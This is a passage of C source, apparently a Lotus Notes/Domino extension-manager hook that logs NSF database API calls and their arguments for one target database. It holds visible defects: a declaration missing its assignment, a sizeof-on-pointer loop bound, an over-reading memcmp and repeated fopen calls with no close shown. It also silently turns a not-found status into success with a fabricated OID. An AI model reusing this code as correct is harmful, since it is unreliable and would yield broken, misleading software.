			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				DHANDLE table = VARARG_GET(ap, DHANDLE);
				UNID far * unids = VARARG_GET(ap, UNID far *);

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NSFDBDELETENOTES(");
				}
				else {
					LogLine("-> AFTER EM_NSFDBDELETENOTES(");
				}
				sprintf(out, "%d, %d, ", hDb, table);
				LogLine(out);
				if (NULL == unids)
					LogLine("NULL)");
				else {
					LogLine("[ ");
					for (int i = 0; i < sizeof(unids) / sizeof(UNID); i++) {
						sprintf(out, "{ { 0x%X:0x%X }, { 0x%X:0x%X } }, ", unids[i].File.Innards[1], unids[i].File.Innards[0], unids[i].Note.Innards[1], unids[i].Note.Innards[0]);
						LogLine(out);
					}
					LogLine("] )");
				}
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NSFDBFREEOBJECT:
			hDb = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				DWORD objid = VARARG_GET(ap, DWORD);

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NSFDBFREEOBJECT(");
				}
				else {
					LogLine("-> AFTER EM_NSFDBFREEOBJECT(");
				}
				sprintf(out, "%d, 0x%X)", hDb, objid);
				LogLine(out);
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NSFDBGETMODIFIEDNOTETABLE:
			hDb = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				WORD clsmask = VARARG_GET(ap, WORD);
				TIMEDATE since = VARARG_GET(ap, TIMEDATE);
				TIMEDATE far * until = VARARG_GET(ap, TIMEDATE far *);
				DHANDLE far * table = VARARG_GET(ap, DHANDLE far *);

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NSFDBGETMODIFIEDNOTETABLE(");
				}
				else {
					LogLine("-> AFTER EM_NSFDBGETMODIFIEDNOTETABLE(");
				}
				sprintf(out, "%d, 0x%X, { 0x%X:0x%X }, ", hDb, clsmask, since.Innards[1], since.Innards[0]);
				LogLine(out);
				if (NULL == until)
					LogLine("NULL, ");
				else {
					sprintf(out, "{ 0x%X:0x%X }, ", until->Innards[1], until->Innards[0]);
					LogLine(out);
				}
				if (NULL == table)
					LogLine("NULL)");
				else {
					sprintf(out, "%d)", *table);
					LogLine(out);
				}
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NSFDBGETNOTEINFO:
			hDb = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				NOTEID noteid = VARARG_GET(ap, NOTEID);
				OID far * oid = VARARG_GET(ap, OID far *);
				TIMEDATE far * mod = VARARG_GET(ap, TIMEDATE far *);
				WORD far * cls = VARARG_GET(ap, WORD far *);

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NSFDBGETNOTEINFO(");
				}
				else {
					LogLine("-> AFTER EM_NSFDBGETNOTEINFO(");
				}
				sprintf(out, "%d, 0x%X, ", hDb, noteid);
				LogLine(out);
				if (NULL == oid)
					LogLine("NULL, ");
				else {
					sprintf(out, "{ { 0x%X:0x%X }, { 0x%X:0x%X }, %ul, { 0x%X:0x%X } }, ", oid->File.Innards[1], oid->File.Innards[0], oid->Note.Innards[1], oid->Note.Innards[0], oid->Sequence, oid->SequenceTime.Innards[1], oid->SequenceTime.Innards[0]);
					LogLine(out);
				}
				if (NULL == mod)
					LogLine("NULL, ");
				else {
					sprintf(out, "{ 0x%X:0x%X }, ", mod->Innards[1], mod->Innards[0]);
					LogLine(out);
				}
				if (NULL == cls)
					LogLine("NULL)");
				else {
					sprintf(out, "%d)", *cls);
					LogLine(out);
				}
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NSFDBGETNOTEINFOBYUNID:
			hDb = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				UNID far * unid = VARARG_GET(ap, UNID far *);
				NOTEID noteid = VARARG_GET(ap, NOTEID);
				OID far * oid = VARARG_GET(ap, OID far *);
				TIMEDATE far * mod = VARARG_GET(ap, TIMEDATE far *);
				WORD far * cls = VARARG_GET(ap, WORD far *);

				if (record->NotificationType == EM_BEFORE) {
					/*////
					STATUS err = NSFDbGetNoteInfoByUNID(hDb, unid, &couchID, NULL, NULL, NULL);
					//sprintf(out, "err: %X\n", err);
					//LogLine(out);
					if (err == ERR_NOT_FOUND) {
						//LogLine("Faking note\n");
						// spawn document
						NOTEHANDLE * fnote = (NOTEHANDLE *)malloc(sizeof(NOTEHANDLE));
						OSMemAlloc(MEM_SHARE | MEM_GROWABLE, (DWORD)5, fnote);
						NSFNoteCreate(hDb, fnote);
						OID * bufoid = (OID *)malloc(sizeof(OID));
						NSFNoteGetInfo(*fnote, _NOTE_OID, bufoid);
						memcpy(&(bufoid->File), &(unid->File), sizeof(DBID));
						memcpy(&(bufoid->Note), &(unid->Note), sizeof(TIMEDATE));
						NSFNoteSetInfo(*fnote, _NOTE_OID, bufoid);
						WORD * bufNClass = (WORD *)malloc(sizeof(WORD));
						*bufNClass = NOTE_CLASS_DOCUMENT;
						NSFNoteSetInfo(*fnote, _NOTE_CLASS, bufNClass);
						NSFItemAppend(*fnote, ITEM_SUMMARY, "Form", strlen("Form"), TYPE_TEXT, "test", (DWORD)strlen("test"));
						err = NSFNoteUpdateExtended(*fnote, UPDATE_FORCE);
						if (err) {
							sprintf(out, "FAKING NOTE FAILED: %d - ", err);
							LogLine(out);
							OSLoadString(NULLHANDLE, ERR(err), out, sizeof(out) - 1);
							LogLine(out);
							LogLine("\n");
						}
					}
					else {
						sprintf(out, "Couch ID: %X", couchID);
					}
					////*/
					LogLine("-> BEFORE EM_NSFDBGETNOTEINFOBYUNID(");
				}
				else {
					LogLine("-> AFTER EM_NSFDBGETNOTEINFOBYUNID(");
				}
				if (record->NotificationType == EM_AFTER) {
					if (record->Status == ERR_NOT_FOUND) {
						// OID
						if (NULL == oid)
							oid = (OID *)malloc(sizeof(OID));
						NSFDbGenerateOID(hDb, oid);
						memcpy(&(oid->File), &(unid->File), sizeof(DBID));
						memcpy(&(oid->Note), &(unid->Note), sizeof(TIMEDATE));
						oid->Sequence = (DWORD)1;
						// NOTE ID
						/*NOTEID bufid = (NOTEID)0;
						NSFDbCreateNoteID(hDb, TRUE, &bufid);
						memcpy(&noteid, &bufid, sizeof(NOTEID));*/

						record->Status = NO_ERROR;
					}
				}
				sprintf(out, "%d, ", hDb);
				LogLine(out);
				if (NULL == unid)
					LogLine("NULL, ");
				else {
					sprintf(out, "{ { 0x%X:0x%X }, { 0x%X:0x%X } }, ", unid->File.Innards[1], unid->File.Innards[0], unid->Note.Innards[1], unid->Note.Innards[0]);
					LogLine(out);
				}
				sprintf(out, "0x%X, ", noteid);
				LogLine(out);
				if (NULL == oid)
					LogLine("NULL, ");
				else {
					sprintf(out, "{ { 0x%X:0x%X }, { 0x%X:0x%X }, %ul, { 0x%X:0x%X } }, ", oid->File.Innards[1], oid->File.Innards[0], oid->Note.Innards[1], oid->Note.Innards[0], oid->Sequence, oid->SequenceTime.Innards[1], oid->SequenceTime.Innards[0]);
					LogLine(out);
				}
				if (NULL == mod)
					LogLine("NULL, ");
				else {
					sprintf(out, "{ 0x%X:0x%X }, ", mod->Innards[1], mod->Innards[0]);
					LogLine(out);
				}
				if (NULL == cls)
					LogLine("NULL)");
				else {
					sprintf(out, "%d)", *cls);
					LogLine(out);
				}
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);

					/*if (record->Status == ERR_NOT_FOUND) {
						// OID
						OID * bufoid = (OID *)malloc(sizeof(OID));
						NSFDbGenerateOID(hDb, bufoid);
						memcpy(&(bufoid->File), &(unid->File), sizeof(DBID));
						memcpy(&(bufoid->Note), &(unid->Note), sizeof(TIMEDATE));
						free(bufoid);
						// NOTE ID
						NOTEID bufid = (NOTEID)0;
						NSFDbCreateNoteID(hDb, TRUE, &bufid);
						memcpy(&noteid, &bufid, sizeof(NOTEID));
						// mod time
						if (NULL == mod)
							mod = (TIMEDATE far *) malloc(sizeof(TIMEDATE));
						OSCurrentTIMEDATE(mod);
						// class
						if (NULL == cls)
							cls = (WORD far *) malloc(sizeof(WORD));
						*cls = NOTE_CLASS_DOCUMENT;

						record->Status = NO_ERROR;
					}*/
				}
				LogLine("\n");
			}

			break;
		case EM_NSFDBGETOBJECTSIZE:
			hDb = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				DWORD objid = VARARG_GET(ap, DWORD);
				WORD type = VARARG_GET(ap, WORD);
				DWORD far * size = VARARG_GET(ap, DWORD far *);
				WORD far * cls VARARG_GET(ap, WORD far *);
				WORD far * priv = VARARG_GET(ap, WORD far *);

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NSFDBGETOBJECTSIZE(");
				}
				else {
					LogLine("-> AFTER EM_NSFDBGETOBJECTSIZE(");
				}
				sprintf(out, "%d, 0x%X, %d, ", hDb, objid, type);
				LogLine(out);
				if (NULL == size)
					LogLine("NULL, ");
				else {
					sprintf(out, "%ul, ", *size);
					LogLine(out);
				}
				if (NULL == cls)
					LogLine("NULL, ");
				else {
					sprintf(out, "%d, ", *cls);
					LogLine(out);
				}
				if (NULL == priv)
					LogLine("NULL)");
				else {
					sprintf(out, "0x%X)", *priv);
					LogLine(out);
				}
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NSFDBGETSPECIALNOTEID:
			hDb = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				WORD idx = VARARG_GET(ap, WORD);
				NOTEID far * noteid = VARARG_GET(ap, NOTEID far *);

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NSFDBGETSPECIALNOTEID(");
				}
				else {
					LogLine("-> AFTER EM_NSFDBGETSPECIALNOTEID(");
				}
				sprintf(out, "%d, 0x%X, ", hDb, idx);
				LogLine(out);
				if (NULL == noteid)
					LogLine("NULL)");
				else {
					sprintf(out, "0x%X)", *noteid);
					LogLine(out);
				}
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NSFDBINFOGET:
			hDb = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				char far * buffer = VARARG_GET(ap, char far *);
				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NSFDBINFOGET(");
				}
				else {
					LogLine("-> AFTER EM_NSFDBINFOGET(");
				}
				sprintf(out, "%d, ", hDb);
				LogLine(out);
				if (NULL == buffer)
					LogLine("NULL)");
				else {
					sprintf(out, "%s)", buffer);
					LogLine(out);
				}
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NSFDBINFOSET:
			hDb = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				char far * buffer = VARARG_GET(ap, char far *);

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NSFDBINFOSET(");
				}
				else {
					LogLine("-> AFTER EM_NSFDBINFOSET(");
				}
				sprintf(out, "%d, ", hDb);
				LogLine(out);
				if (NULL == buffer)
					LogLine("NULL)");
				else {
					sprintf(out, "%s)", buffer);
					LogLine(out);
				}
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NSFDBLOCATEBYREPLICAID:
			hDb = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				DBID far * id = VARARG_GET(ap, DBID far *);
				char far * path = VARARG_GET(ap, char far *);
				WORD length = VARARG_GET(ap, WORD);

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NSFDBLOCATEBYREPLICAID(");
				}
				else {
					LogLine("-> AFTER EM_NSFDBLOCATEBYREPLICAID(");
				}
				sprintf(out, "%d, ", hDb);
				LogLine(out);
				if (NULL == id)
					LogLine("NULL, ");
				else {
					sprintf(out, "{ 0x%X:0x%X }, ", id->Innards[1], id->Innards[0]);
					LogLine(out);
				}
				if (NULL == path)
					LogLine("NULL, ");
				else {
					sprintf(out, "%s, ", path);
					LogLine(out);
				}
				sprintf(out, "%d)", length);
				LogLine(out);
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NSFDBMODIFIEDTIME:
			hDb = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				TIMEDATE far * dmod = VARARG_GET(ap, TIMEDATE far *);
				TIMEDATE far * ndmod = VARARG_GET(ap, TIMEDATE far *);

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NSFDBMODIFIEDTIME(");
				}
				else {
					LogLine("-> AFTER EM_NSFDBMODIFIEDTIME(");
				}
				sprintf(out, "%d, ", hDb);
				LogLine(out);
				if (NULL == dmod)
					LogLine("NULL, ");
				else {
					sprintf(out, "{ 0x%X:0x%X }, ", dmod->Innards[1], dmod->Innards[0]);
					LogLine(out);
				}
				if (NULL == ndmod)
					LogLine("NULL)");
				else {
					sprintf(out, "{ 0x%X:0x%X })", ndmod->Innards[1], ndmod->Innards[0]);
					LogLine(out);
				}
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NSFDBREADOBJECT:
			hDb = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				DWORD id = VARARG_GET(ap, DWORD);
				DWORD offset = VARARG_GET(ap, DWORD);
				DWORD length = VARARG_GET(ap, DWORD);
				DHANDLE far * buffer = VARARG_GET(ap, DHANDLE far *);

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NSFDBREADOBJECT(");
				}
				else {
					LogLine("-> AFTER EM_NSFDBREADOBJECT(");
				}
				sprintf(out, "%d, 0x%X, %ul, %ul, ", hDb, id, offset, length);
				LogLine(out);
				if (NULL == buffer)
					LogLine("NULL)");
				else {
					sprintf(out, "%ud)", buffer);
					LogLine(out);
				}
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NSFDBREALLOCOBJECT:
			hDb = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				DWORD id = VARARG_GET(ap, DWORD);
				DWORD size = VARARG_GET(ap, DWORD);

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NSFDBREALLOCOBJECT(");
				}
				else {
					LogLine("-> AFTER EM_NSFDBREALLOCOBJECT(");
				}
				sprintf(out, "%d, 0x%X, %ul)", hDb, id, size);
				LogLine(out);
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NSFDBREPLICAINFOGET:
			hDb = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				DBREPLICAINFO far * info = VARARG_GET(ap, DBREPLICAINFO far *);

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NSFDBREPLICAINFOGET(");
				}
				else {
					LogLine("-> AFTER EM_NSFDBREPLICAINFOGET(");
				}
				sprintf(out, "%d, ", hDb);
				LogLine(out);
				if (NULL == info)
					LogLine("NULL)");
				else {
					sprintf(out, "{ { 0x%X:0x%X }, 0x%X, %d, { 0x%X:0x%X } })", info->ID.Innards[1], info->ID.Innards[0], info->Flags, info->CutoffInterval, info->Cutoff.Innards[1], info->Cutoff.Innards[0]);
					LogLine(out);
				}
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NSFDBREPLICAINFOSET:
			hDb = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				DBREPLICAINFO far * info = VARARG_GET(ap, DBREPLICAINFO far *);

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NSFDBREPLICAINFOSET(");
				}
				else {
					LogLine("-> AFTER EM_NSFDBREPLICAINFOSET(");
				}
				sprintf(out, "%d, ", hDb);
				LogLine(out);
				if (NULL == info)
					LogLine("NULL)");
				else {
					sprintf(out, "{ { 0x%X:0x%X }, 0x%X, %d, { 0x%X:0x%X } })", info->ID.Innards[1], info->ID.Innards[0], info->Flags, info->CutoffInterval, info->Cutoff.Innards[1], info->Cutoff.Innards[0]);
					LogLine(out);
				}
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NSFDBSPACEUSAGE:
			hDb = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				DWORD far * allocated = VARARG_GET(ap, DWORD far *);
				DWORD far * free = VARARG_GET(ap, DWORD far *);

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NSFDBSPACEUSAGE(");
				}
				else {
					LogLine("-> AFTER EM_NSFDBSPACEUSAGE(");
				}
				sprintf(out, "%d, ", hDb);
				LogLine(out);
				if (NULL == allocated)
					LogLine("NULL, ");
				else {
					sprintf(out, "%ul, ", *allocated);
					LogLine(out);
				}
				if (NULL == free)
					LogLine("NULL)");
				else {
					sprintf(out, "%ul)", *free);
					LogLine(out);
				}
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NSFDBSTAMPNOTES:
			hDb = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				DHANDLE table = VARARG_GET(ap, DHANDLE);
				const char far * name = VARARG_GET(ap, const char far *);
				WORD ilength = VARARG_GET(ap, WORD);
				void far * data = VARARG_GET(ap, void far *);
				WORD dlength = VARARG_GET(ap, WORD);

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NSFDBSTAMPNOTES(");
				}
				else {
					LogLine("-> AFTER EM_NSFDBSTAMPNOTES(");
				}
				sprintf(out, "%d, %ud, ", hDb, table);
				LogLine(out);
				if (NULL == name)
					LogLine("NULL, ");
				else {
					sprintf(out, "%s, ", name);
					LogLine(out);
				}
				sprintf(out, "%d, <...>, %d)", ilength, dlength);
				LogLine(out);
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NSFDBWRITEOBJECT:
			hDb = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				DWORD id = VARARG_GET(ap, DWORD);
				DHANDLE buffer = VARARG_GET(ap, DHANDLE);
				DWORD offset = VARARG_GET(ap, DWORD);
				DWORD length = VARARG_GET(ap, DWORD);

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NSFDBWRITEOBJECT(");
				}
				else {
					LogLine("-> AFTER EM_NSFDBWRITEOBJECT(");
				}
				sprintf(out, "%d, 0x%X, %ud, %ul, %ul)", hDb, id, buffer, offset, length);
				LogLine(out);
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NSFNOTEUPDATE:
			note = VARARG_GET(ap, NOTEHANDLE);

			hDb = (DBHANDLE)0;
			NSFNoteGetInfo(note, _NOTE_DB, &hDb);
			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				flags = VARARG_GET(ap, WORD);

				gLogStream = fopen(LogFile, "a+");

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NSFNOTEUPDATE(");
				}
				else {
					LogLine("-> AFTER EM_NSFNOTEUPDATE(");
				}
				sprintf(out, "%d, 0x%X)", note, flags);
				LogLine(out);
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NIFOPENCOLLECTION:
			hDbV = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDbV, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			hDbD = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDbD, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = logit | memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				NOTEID noteid = VARARG_GET(ap, NOTEID);
				WORD flags = VARARG_GET(ap, WORD);
				DHANDLE unread = VARARG_GET(ap, DHANDLE);
				HCOLLECTION far * coll = VARARG_GET(ap, HCOLLECTION far *);
				NOTEHANDLE far * note = VARARG_GET(ap, NOTEHANDLE far *);
				UNID far * unid = VARARG_GET(ap, UNID far *);
				DHANDLE far * clist = VARARG_GET(ap, DHANDLE far *);
				DHANDLE far * slist = VARARG_GET(ap, DHANDLE far *);

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NIFOPENCOLLECTION(");
				}
				else {
					LogLine("-> AFTER EM_NIFOPENCOLLECTION(");
				}
				sprintf(out, "%d, %d, 0x%X, 0x%X, %ud, ", hDbV, hDbD, noteid, flags, unread);
				LogLine(out);
				if (NULL == coll)
					LogLine("NULL, ");
				else {
					sprintf(out, "%d, ", *coll);
					LogLine(out);
				}
				if (NULL == note)
					LogLine("NULL, ");
				else {
					sprintf(out, "%d, ", *note);
					LogLine(out);
				}
				if (NULL == unid)
					LogLine("NULL, ");
				else {
					sprintf(out, "{ { 0x%X:0x%X }, { 0x%X:0x%X } }, ", unid->File.Innards[1], unid->File.Innards[0], unid->Note.Innards[1], unid->Note.Innards[0]);
					LogLine(out);
				}
				if (NULL == clist)
					LogLine("NULL, ");
				else {
					sprintf(out, "%d, ", *clist);
					LogLine(out);
				}
				if (NULL == slist)
					LogLine("NULL)");
				else {
					sprintf(out, "%d)", *slist);
					LogLine(out);
				}
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");

				if (NULL != coll)
					addCollection(*coll);
			}
			/*else {
				NOTEID noteid = VARARG_GET(ap, NOTEID);
				WORD flags = VARARG_GET(ap, WORD);
				DHANDLE unread = VARARG_GET(ap, DHANDLE);
				HCOLLECTION far * coll = VARARG_GET(ap, HCOLLECTION far *);

				if (NULL != coll)
					addCollection(*coll);
			}*/

			break;
		case EM_NIFCLOSECOLLECTION:
			coll = VARARG_GET(ap, HCOLLECTION);

			if (isInList(coll) == 0) {
				gLogStream = fopen(LogFile, "a+");

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NIFCLOSECOLLECTION(");
				}
				else {
					LogLine("-> AFTER EM_NIFCLOSECOLLECTION(");
				}
				sprintf(out, "%d)", coll);
				LogLine(out);
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");

				discardCollection(coll);
			}
			/*else {
				discardCollection(coll);
			}*/

			break;
		case EM_NSFDBGETBUILDVERSION:
			break;
		case EM_NSFDBRENAME:
			break;
		case EM_NSFDBITEMDEFTABLE:
			hDb = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				ITEMDEFTABLEHANDLE far * table = VARARG_GET(ap, ITEMDEFTABLEHANDLE far *);

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NSFDBITEMDEFTABLE(");
				}
				else {
					LogLine("-> AFTER EM_NSFDBITEMDEFTABLE(");
				}
				sprintf(out, "%d, ", hDb);
				LogLine(out);
				if (NULL == table)
					LogLine("NULL)");
				else {
					sprintf(out, "%d)", *table);
